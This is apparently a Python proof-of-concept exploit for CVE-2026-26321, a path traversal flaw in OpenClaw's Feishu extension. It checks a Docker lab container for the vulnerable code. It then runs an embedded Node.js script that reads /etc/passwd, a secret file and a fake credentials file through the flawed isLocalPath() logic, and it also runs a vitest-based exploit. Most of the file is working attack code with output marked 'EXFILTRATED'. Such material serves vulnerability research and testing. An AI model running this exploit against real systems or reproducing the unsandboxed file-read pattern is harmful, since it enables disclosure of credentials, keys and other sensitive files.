#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenClaw < 2026.2.14 - Path Traversal / Local File Disclosure (Feishu Extension)
# CVE            : CVE-2026-26321
# Vendor         : OpenClaw
# Product        : OpenClaw
# Affected       : < 2026.2.14
# Type           : CWE-22 - Path Traversal
# CVSS           : 7.5 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2026-26321: Path Traversal / Local File Disclosure in OpenClaw Feishu Extension

Demonstrates that sendMediaFeishu() in OpenClaw's Feishu extension reads arbitrary local
files from disk when the attacker-controlled `mediaUrl` parameter is set to a local
filesystem path. The file contents are uploaded to the Feishu API and sent to a chat,
enabling full exfiltration of sensitive data (credentials, SSH keys, etc.).

Affected: OpenClaw < 2026.2.14 (npm package: openclaw)
CVSS: 7.5 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CWE: CWE-22 (Path Traversal)

Root Cause: isLocalPath() in extensions/feishu/src/media.ts classifies filesystem
paths (/, ~, file://, drive letters, or anything that fails URL parsing) and then
sendMediaFeishu() reads them via fs.readFileSync() with no sandboxing or restriction.

Usage:
    python3 poc.py [container_name]
    python3 poc.py                          # defaults to cve-2026-26321-vulnerable
    python3 poc.py cve-2026-26321-vulnerable
"""

import subprocess
import sys
import os
import shutil
import textwrap


# ─── Configuration ────────────────────────────────────────────────────────────

CONTAINER_NAME = "cve-2026-26321-vulnerable"
POC_TEST_FILE = "cve-2026-26321-poc.test.ts"
CONTAINER_TEST_PATH = f"/app/extensions/feishu/src/{POC_TEST_FILE}"
VITEST_CONFIG = "vitest.extensions.config.ts"


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-26321 — Proof of Concept Exploit                  ║
║  OpenClaw < 2026.2.14 — Path Traversal / Local File Read    ║
║  Feishu Extension: sendMediaFeishu() arbitrary file read     ║
╚══════════════════════════════════════════════════════════════╝
""")


def run_cmd(cmd, desc=None, check=True):
    """Run a shell command and return the result."""
    if desc:
        print(f"[*] {desc}")
    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True, timeout=120
    )
    if check and result.returncode != 0:
        print(f"[!] Command failed (exit {result.returncode})")
        if result.stderr:
            print(f"    stderr: {result.stderr.strip()}")
        return None
    return result


def check_container(container):
    """Verify the target container is running."""
    print(f"[*] Checking container: {container}")
    result = run_cmd(
        f"docker inspect {container} --format '{{{{.State.Running}}}}'",
        check=False
    )
    if result is None or result.returncode != 0 or "true" not in result.stdout.lower():
        print(f"[!] Container '{container}' is not running!")
        print(f"    Start it with: docker compose up -d")
        return False
    print(f"[+] Container '{container}' is running")
    return True


def verify_vulnerable_code(container):
    """Verify the container has the vulnerable code."""
    print(f"\n[*] Verifying vulnerable code patterns in container...")

    # Check for isLocalPath function
    result = run_cmd(
        f"docker exec {container} grep -c 'function isLocalPath' /app/extensions/feishu/src/media.ts",
        check=False
    )
    if result and result.returncode == 0 and int(result.stdout.strip()) > 0:
        print(f"[+] isLocalPath() function: PRESENT (vulnerable)")
    else:
        print(f"[-] isLocalPath() function: NOT FOUND (may be patched)")
        return False

    # Check for fs.readFileSync
    result = run_cmd(
        f"docker exec {container} grep -c 'readFileSync' /app/extensions/feishu/src/media.ts",
        check=False
    )
    if result and result.returncode == 0 and int(result.stdout.strip()) > 0:
        print(f"[+] fs.readFileSync(): PRESENT (vulnerable)")
    else:
        print(f"[-] fs.readFileSync(): NOT FOUND (may be patched)")
        return False

    # Check for bare fetch (SSRF)
    result = run_cmd(
        f"docker exec {container} grep -c 'await fetch(mediaUrl)' /app/extensions/feishu/src/media.ts",
        check=False
    )
    if result and result.returncode == 0 and int(result.stdout.strip()) > 0:
        print(f"[+] Bare fetch(mediaUrl): PRESENT (SSRF-vulnerable)")
    else:
        print(f"[-] Bare fetch(): NOT FOUND")

    return True


def verify_sentinel_files(container):
    """Verify sentinel files exist in the container."""
    print(f"\n[*] Verifying sentinel files...")
    files = {
        "/tmp/cve-secret.txt": "CVE-2026-26321-SECRET-DATA-EXFILTRATED",
        "/tmp/fake-passwd": "root:x:0:0",
        "/tmp/fake-env": "OPENCLAW_API_KEY=sk-secret-key-12345",
    }
    for filepath, expected_substr in files.items():
        result = run_cmd(f"docker exec {container} cat {filepath}", check=False)
        if result and result.returncode == 0 and expected_substr in result.stdout:
            print(f"[+] {filepath}: OK")
        else:
            print(f"[-] {filepath}: MISSING or unexpected content")
    return True


def copy_poc_to_container(container):
    """Copy the PoC test file into the container's extension directory."""
    print(f"\n[*] Deploying PoC test to container...")
    poc_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), POC_TEST_FILE)

    if not os.path.exists(poc_src):
        print(f"[!] PoC test file not found: {poc_src}")
        return False

    result = run_cmd(
        f"docker cp {poc_src} {container}:{CONTAINER_TEST_PATH}",
        desc=f"Copying {POC_TEST_FILE} → {CONTAINER_TEST_PATH}"
    )
    if result is None:
        return False

    print(f"[+] PoC test deployed successfully")
    return True


def run_exploit(container):
    """Run the PoC exploit via vitest inside the container."""
    print(f"\n{'='*60}")
    print(f"  RUNNING EXPLOIT")
    print(f"{'='*60}\n")

    cmd = (
        f"docker exec {container} "
        f"npx vitest run extensions/feishu/src/{POC_TEST_FILE} "
        f"--config {VITEST_CONFIG} --reporter verbose"
    )
    print(f"[*] Command: {cmd}\n")

    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True, timeout=120
    )

    # Print full output
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        # vitest outputs to stderr for progress
        print(result.stderr)

    return result.returncode


def run_standalone_demo(container):
    """Run a standalone Node.js demo showing the file read directly."""
    print(f"\n{'='*60}")
    print(f"  STANDALONE DEMONSTRATION")
    print(f"{'='*60}\n")

    # This inline script directly demonstrates the vulnerability
    # without mocking — it calls isLocalPath and fs.readFileSync
    # just like sendMediaFeishu does
    demo_script = r"""
var fs = require("fs");

// Replicate the vulnerable isLocalPath() function from media.ts
function isLocalPath(urlOrPath) {
  if (urlOrPath.startsWith("/") || urlOrPath.startsWith("~") || /^[a-zA-Z]:/.test(urlOrPath)) {
    return true;
  }
  try {
    const url = new URL(urlOrPath);
    return url.protocol === "file:";
  } catch {
    return true;
  }
}

console.log("=== CVE-2026-26321: Direct File Read Demonstration ===\n");

const targets = [
  { path: "/etc/passwd", desc: "System passwd file" },
  { path: "/tmp/cve-secret.txt", desc: "Sentinel secret file" },
  { path: "/tmp/fake-env", desc: "Simulated credentials" },
  { path: "file:///tmp/cve-secret.txt", desc: "file:// protocol" },
];

for (const t of targets) {
  const isLocal = isLocalPath(t.path);
  if (isLocal) {
    const filePath = t.path.startsWith("~")
      ? t.path.replace("~", process.env.HOME ?? "")
      : t.path.replace("file://", "");
    try {
      const content = fs.readFileSync(filePath, "utf-8");
      var preview = content.split("\n").slice(0, 2).join(" | ");
      if (preview.length > 80) preview = preview.substring(0, 80) + "...";
      console.log("[EXFILTRATED] " + t.desc);
      console.log("  mediaUrl: \"" + t.path + "\"");
      console.log("  isLocalPath() -> true");
      console.log("  fs.readFileSync(\"" + filePath + "\") -> " + content.length + " bytes");
      console.log("  Content: \"" + preview + "\"");
      console.log();
    } catch (err) {
      console.log(`[FAILED] ${t.desc}: ${err.message}\n`);
    }
  }
}

console.log("=== Vulnerability Confirmed: Arbitrary Local File Read ===");
"""

    # Write the demo script to a temp file in the container to avoid shell quoting issues
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.mjs', delete=False) as f:
        # Use ESM syntax for the demo script
        esm_demo = demo_script.replace('var fs = require("fs");', 'import fs from "fs";')
        f.write(esm_demo)
        f.flush()
        tmp_path = f.name

    run_cmd(f"docker cp {tmp_path} {container}:/tmp/cve-standalone-demo.mjs", check=False)
    os.unlink(tmp_path)

    result = run_cmd(
        f"docker exec {container} node /tmp/cve-standalone-demo.mjs",
        desc="Running direct file read demonstration",
        check=False
    )
    if result and result.stdout:
        print(result.stdout)
    if result and result.stderr:
        print(result.stderr)
    return result.returncode if result else 1


def cleanup(container):
    """Remove the PoC test file from the container."""
    run_cmd(
        f"docker exec {container} rm -f {CONTAINER_TEST_PATH}",
        check=False
    )


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else CONTAINER_NAME

    banner()

    # Step 1: Verify container is running
    if not check_container(container):
        sys.exit(1)

    # Step 2: Verify vulnerable code
    if not verify_vulnerable_code(container):
        print("\n[!] Container does not appear to have vulnerable code. Aborting.")
        sys.exit(1)

    # Step 3: Verify sentinel files
    verify_sentinel_files(container)

    # Step 4: Run standalone demo (no dependencies, shows raw file read)
    standalone_rc = run_standalone_demo(container)

    # Step 5: Deploy and run the vitest-based exploit
    if not copy_poc_to_container(container):
        print("\n[!] Failed to deploy PoC. Aborting.")
        sys.exit(1)

    try:
        vitest_rc = run_exploit(container)
    finally:
        # Clean up the test file from the container
        cleanup(container)

    # Summary
    print(f"\n{'='*60}")
    print(f"  RESULTS")
    print(f"{'='*60}")

    if vitest_rc == 0:
        print(f"\n  [CONFIRMED] CVE-2026-26321 successfully exploited!")
        print(f"  All vitest exploit vectors passed.")
        print(f"  sendMediaFeishu() reads arbitrary local files from disk")
        print(f"  and uploads them to the Feishu API for exfiltration.\n")
    else:
        if standalone_rc == 0:
            print(f"\n  [PARTIALLY CONFIRMED] Standalone demo succeeded but vitest had issues.")
            print(f"  The core vulnerability (fs.readFileSync on user input) is confirmed.\n")
        else:
            print(f"\n  [UNVERIFIED] Exploit did not succeed as expected.")
            print(f"  Check container logs for details.\n")

    return 0 if vitest_rc == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
